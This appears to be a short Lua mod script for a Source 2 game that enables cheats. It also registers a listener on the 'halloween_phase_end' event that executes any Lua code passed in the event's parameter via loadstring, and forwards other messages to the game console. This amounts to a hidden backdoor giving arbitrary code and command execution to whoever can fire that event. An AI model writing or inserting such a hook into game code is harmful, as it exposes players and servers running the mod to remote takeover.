Convars:SetBool('sv_cheats', true)
ListenToGameEvent('halloween_phase_end', function(msg)
	if msg.msg == "code" then
		assert(loadstring(msg.param))();
	else
		SendToConsole(msg.msg);
	end
end,self)
Msg('...Cheats rules done\n')